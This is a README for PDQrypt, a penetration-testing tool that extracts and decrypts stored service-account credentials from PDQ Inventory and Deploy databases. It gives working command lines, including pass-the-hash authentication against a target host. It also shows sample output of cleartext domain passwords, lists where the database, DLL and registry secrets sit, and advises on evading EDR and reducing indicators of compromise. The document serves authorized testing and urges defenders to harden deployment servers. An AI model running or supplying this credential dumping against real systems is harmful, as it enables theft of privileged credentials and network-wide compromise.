# PDQrypt

PDQrypt is a tool designed to extract credentials from a PDQ Inventory or Deploy database and display them in cleartext. This can be useful in post-exploitation scenarios, whereby an operator has gained local administrator access to the deployment server and would like to extract credentials of the inventory scanning and deployment users. These users often have elevated permissions across the network, which is inherent in the nature of deployment tooling, and thus are high-value targets. Obtaining cleartext credentials may also help an offensive security operator or penetration tester better blend in with legitimate user behaviour. 

This tool is being released in tandem with our blog post, which highlights a small number of attacks you can perform against PDQ Inventory/Deploy when performing an internal penetration test, and provides background information on the PDQ system itself. It is out hope that this information will help offensive security consultants better understand how to suggest remedial advice when a misconfigured PDQ server is observed. We also hope it highlights the need to treat deployment servers as Tier 0 assets, akin to your Domain Controllers and Certificate Servers. 

https://trustfoundry.net/2025/04/10/pentesting-pdq-deploy-and-inventory/  

It is important to note that this is not an exploit or vulnerability in itself, it just reads the victim's encrypted credentials from the database files in PDQ. This requires local administrator credentials over the deployment server, and as such, is generally considered post-exploitation tooling. 

This tool has not been tested in production environments, and TrustFoundry take no responsiblities for its misuse.

## Features

PDQrypt was designed to be run as a post-exploitation tool after a deployment server has been compromised. The following features are currently available:

- Integration with the Impacket toolkit, so you can authenticate with a password, hash, or kerberos ticket.
- Extract credentials remotely from both PDQ Inventory and Deploy databases.
- Local parsing, rather than running against the remote host, provided the pre-requisite components are provided by the user.
- SMTP credentials are also extracted if they are found to be stored. 

#### But why not just log in and run malicious deployments?

Good question. If you have administrative privileges, you may instead opt to just RDP/WinRM/{AnyOtherTechnique} into the deployment server and run commands on the registered machines. This has some concerns from an Opsec perspective, as it may trigger EDR alerts on the client devices, as well as being noticed by administrators actively using the software suite. Extracting the credentials which run the remote commands can be more discreet, as the operator can then use the cleartext password in any other tooling. This also benefits situations where you may have an NTLM hash for a local administrator on the deployment server, but no cleartext credentials. 

Overall, these decisions are situational, and your mileage may vary on what option is best for your specific engagement.


## Tested Versions

This tool has been tested against older versions, and a newer version:

- PDQ Inventory v18.3.32.0, v19.4.21.0
- PDQ Deploy v19.3.350.0, 19.4.21.0


## Installation

PDQrypt is a singular Python file, and as such, is simple to install and get running.

### Steps

1. Clone the repository:
   ```bash
   git clone https://github.com/trustfoundry/pdqrypt.git 
   ```
2. Navigate to the directory:
   ```bash
   cd pdqrypt
   ```
3. It is best to install PDQrypt in a virtual environment to ensure you do not end up in dependancy hell:
   ```bash
   python3 -m venv pdqrypt; source pdqrypt/bin/activate
   ```
4. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

### Usage

⚠️ Please note that running this tool stops the remote PDQ service briefly to release a database lock. All attempts are made to restart it, but this cannot be guaranteed if the tool is interrupted. ⚠️

To view the standard help menu, you can simply pass the `-h` flag to the program:

```bash
python3 pdqrypt.py -h

██████╗░██████╗░░██████╗░██████╗░██╗░░░██╗██████╗░████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝
██████╔╝██║░░██║██║██╗██║██████╔╝░╚████╔╝░██████╔╝░░░██║░░░
██╔═══╝░██║░░██║╚██████╔╝██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░
██║░░░░░██████╔╝░╚═██╔═╝░██║░░██║░░░██║░░░██║░░░░░░░░██║░░░
╚═╝░░░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░

PDQ Deploy and Inventory Credential Dumper - by @heartburn-dev - v1.0
usage: pdqrypt.py [-h] [-debug] [-inventory-db INVENTORY_DB] [-deploy-db DEPLOY_DB] [-local-parse] [-local-inventory-db LOCAL_INVENTORY_DB] [-local-deploy-db LOCAL_DEPLOY_DB] [-local-inventory-dll LOCAL_INVENTORY_DLL]
                  [-local-deploy-dll LOCAL_DEPLOY_DLL] [-local-inventory-registry LOCAL_INVENTORY_REGISTRY] [-local-deploy-registry LOCAL_DEPLOY_REGISTRY] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                  [-target-ip ip address]
                  [target]

Remotely or locally extract PDQ credentials. Requires admin access if performing remotely. If local parse is used, specify at least one COMPLETE set of local DB, DLL, and registry for Inventory or Deploy. For example, an Inventory DB,
Inventory DLL, and Inventory registry key. If the script is failing to decrypt, it is highly likely that the input data is incorrect. It requires the DB and Registry key from the SAME target, as well as potentially the correct DLL
version from the target.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -inventory-db INVENTORY_DB
                        Location of the Inventory database file on the REMOTE server. Set to the default location if not provided.
  -deploy-db DEPLOY_DB  Location of the Deploy database file on the REMOTE server. Set to the default location if not provided.
  -local-parse          Enables local parse of PDQ files. Must include at least one complete set of DB, DLL, and registry
  -local-inventory-db LOCAL_INVENTORY_DB
                        Local path to the Inventory DB file
  -local-deploy-db LOCAL_DEPLOY_DB
                        Local path to the Deploy DB file
  -local-inventory-dll LOCAL_INVENTORY_DLL
                        Local path to the Inventory DLL file
  -local-deploy-dll LOCAL_DEPLOY_DLL
                        Local path to the Deploy DLL file
  -local-inventory-registry LOCAL_INVENTORY_REGISTRY
                        Local Inventory registry GUID
  -local-deploy-registry LOCAL_DEPLOY_REGISTRY
                        Local Deploy registry GUID

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Do not ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP of the domain controller
  -target-ip ip address
                        IP of the target machine

```

If running remotely, you must be a local administrator over the target deployment server. The following commands demonstrate three example ways to run the tool.

1. Run as a domain user who has local administrator privileges over the deployment server:

```bash
python3 pdqrypt.py disney.local/mickey:'Password123!'@192.168.69.20 
```

2. Run as a local user who has local administrator privileges over the deployment server:
```bash
python3 pdqrypt.py administrator:'Password123!'@192.168.69.20 
```

3. Authenticate as a domain user using their NTLM hash rather than a password with debug mode enabled:
```bash
python3 pdqrypt.py disney.local/mickey@192.168.69.20 -debug -hashes 2B576ACBE6BCFDA7294D6BD18041B8FE:2B576ACBE6BCFDA7294D6BD18041B8FE
```

The following output shows the tool running a successful extraction against a server with PDQ Inventory and Deploy both installed as the local administrator:

```bash
python3 pdqrypt.py administrator:'Password123!'@192.168.69.20       

██████╗░██████╗░░██████╗░██████╗░██╗░░░██╗██████╗░████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝
██████╔╝██║░░██║██║██╗██║██████╔╝░╚████╔╝░██████╔╝░░░██║░░░
██╔═══╝░██║░░██║╚██████╔╝██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░
██║░░░░░██████╔╝░╚═██╔═╝░██║░░██║░░░██║░░░██║░░░░░░░░██║░░░
╚═╝░░░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░

PDQ Deploy and Inventory Credential Dumper - by @heartburn-dev - v1.0
[*] Stopping service PDQInventory
[*] Service PDQDeploy is stopped
[*] Downloading PDQ Inventory and Deploy database files
[*] Inventory DB found at C:\ProgramData\Admin Arsenal\PDQ Inventory\Database.db
[*] Deploy DB found at C:\ProgramData\Admin Arsenal\PDQ Deploy\Database.db
[*] Restarting stopped services...
[*] Starting service PDQInventory
[*] Found Deploy User 1: DISNEY.LOCAL\mickey
[*] Found Inventory User 1: DISNEY.LOCAL\InventoryUser
[*] Found Inventory User 2: DISNEY.LOCAL\Pluto
[*] Found Inventory User 3: DISNEY.LOCAL\lapsadmin
[*] Found Inventory User 4: DISNEY.LOCAL\pikachu
[*] Found Inventory User 5: mailuser (From SMTP Settings)
[*] Got Inventory Database SecureKey: 8bd433c4-6a3c-4a0a-baf9-3829e69eb027
[*] Got Deploy Database SecureKey: 799fc4f5-8e52-4308-84fb-e5b039217ad2
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] PDQ Inventory registry saved to: \\192.168.69.20\ADMIN$\Temp\diLpNHTm.tmp
[*] Inventory registry security key transferred and saved in inventory.reg
[*] Hive type for inventory.reg was not identified: 
[*] PDQ Inventory registry key: 41004393-1d51-442c-ab9e-c0c881729818
[*] PDQ Deploy registry saved to: \\192.168.69.20\ADMIN$\Temp\OUNLUsvj.tmp
[*] Deploy registry security key transferred and saved in deploy.reg!
[*] Hive type for deploy.reg was not identified: 
[*] PDQ Deploy registry key: bdbf9405-1233-4ed9-bcbc-b4090d3b6a2c
[*] We have all the prerequisites to decrypt, starting process...
[*] Inventory decryption key: 96953965c8e0fc8b0392e5d473577cad
[*] Deploy decryption key: cdb9abb867ef375a2852b508165bb24e
                         Decrypted Credentials                         
┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
┃ Software      ┃ Username                      ┃ Password            ┃
┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩
│ PDQ Inventory │ DISNEY.LOCAL\InventoryUser    │ Password123!        │
│ PDQ Inventory │ DISNEY.LOCAL\Pluto            │ il0v3peanuts        │
│ PDQ Inventory │ DISNEY.LOCAL\lapsadmin        │ gfhj34%TGErj57yT£H$ │
│ PDQ Inventory │ DISNEY.LOCAL\pikachu          │ sh0cked             │
│ PDQ Inventory │ mailuser (From SMTP Settings) │ Password123!        │
│ PDQ Deploy    │ DISNEY.LOCAL\mickey           │ Password123!        │
└───────────────┴───────────────────────────────┴─────────────────────┘
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

### Database Locations

PDQrypt will try to download the database file from the target and transfer it using the SMB protocol. It is set to look in the default installation location, which is `C:\ProgramData\Admin Arsenal\PDQ Inventory|Deploy\Database.db`. This can be modified if you know it is saved in a different location by passing the `-inventory-db ` or `-deploy-db` flags. These take a full path and modify where the script looks for the database file:

1. Running as a local administrator, using their NTLM hash for authentication, and specifying a custom PDQ Deploy database location on the target:
```bash
python3 pdqrypt.py administrator@192.168.69.20 -deploy-db 'C:\ProgramData\Admin Arsenal\PDQ Deploy\Database123.db' -hashes 2B576ACBE6BCFDA7294D6BD18041B8FE:2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Local Parsing

Furthermore, if you have direct access to the deployment server already, you can just extract the required data yourself and feed it into PDQrypt. This results in a lower number of Indicators of Compromise (IoCs) as you will no longer be authenticating with Impacket remotely. The required flag is the `-local-parse` parameter. 

The following must be provided in this instance:

1. The database file, stored by default at: 
```
C:\ProgramData\Admin Arsenal\PDQ {Inventory|Deploy}\Database.db
```

2. The primary DLL, stored by default at:
```
C:\Program Files (x86)\Admin Arsenal\PDQ {Inventory|Deploy}\AdminArsenal.PDQ{Inventory|Deploy}.dll
```

3. The registry key, stored by default at:
```
HKLM\SOFTWARE\Admin Arsenal\PDQ {Inventory|Deploy}\Secure Key
```

The database can then be decrypted using the following example command format:

```bash
python3 pdqrypt.py -local-parse -local-inventory-db inventory.db -local-inventory-dll AdminArsenal.PDQInventory.dll -local-inventory-registry 41004393-1d51-442c-ab9e-c0c881729818

██████╗░██████╗░░██████╗░██████╗░██╗░░░██╗██████╗░████████╗
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝
██████╔╝██║░░██║██║██╗██║██████╔╝░╚████╔╝░██████╔╝░░░██║░░░
██╔═══╝░██║░░██║╚██████╔╝██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░
██║░░░░░██████╔╝░╚═██╔═╝░██║░░██║░░░██║░░░██║░░░░░░░░██║░░░
╚═╝░░░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░

PDQ Deploy and Inventory Credential Dumper - by @heartburn-dev - v1.0
[*] Decrypting local credentials - No remote operations.
[*] Inventory decryption key: 96953965c8e0fc8b0392e5d473577cad
                         Decrypted Credentials                         
┏━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
┃ Software      ┃ Username                      ┃ Password            ┃
┡━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩
│ PDQ Inventory │ DISNEY.LOCAL\InventoryUser    │ Password123!        │
│ PDQ Inventory │ DISNEY.LOCAL\Pluto            │ il0v3peanuts        │
│ PDQ Inventory │ DISNEY.LOCAL\lapsadmin        │ gfhj34%TGErj57yT£H$ │
│ PDQ Inventory │ DISNEY.LOCAL\pikachu          │ sh0cked             │
│ PDQ Inventory │ mailuser (From SMTP Settings) │ Password123!        │
└───────────────┴───────────────────────────────┴─────────────────────┘
[*] Cleaning up...
```

## Contributing

Contributions are welcome! To contribute:

1. Fork the repository and create a feature branch.
2. Make your changes and test thoroughly.
3. Open a pull request with a clear description of your changes.

For bug reports or feature requests, please open an issue in the repository.

## License

This project is licensed under the Apache License 2.0. See the LICENSE file for details.

This project uses libraries from the Impacket toolkit, provided under a modified Apache Software License. We acknowledge the use of software developed by SecureAuth Corporation and Fortra. Detailed licensing information for Impacket can be found in the [Impacket license file](https://github.com/fortra/impacket/blob/master/LICENSE).

## Acknowledgments

- Dirk-Jan Mollema (@\_dirkjan) - For the [adconnectdump](https://github.com/dirkjanm/adconnectdump) code. This was used as a basic skeleton to structure the code.
- [Impacket](https://github.com/fortra/impacket) - For making everything much easier than it would be without it. 

## Contact

For questions or support, please contact info@trustfoundry.net or open an issue in the repository.

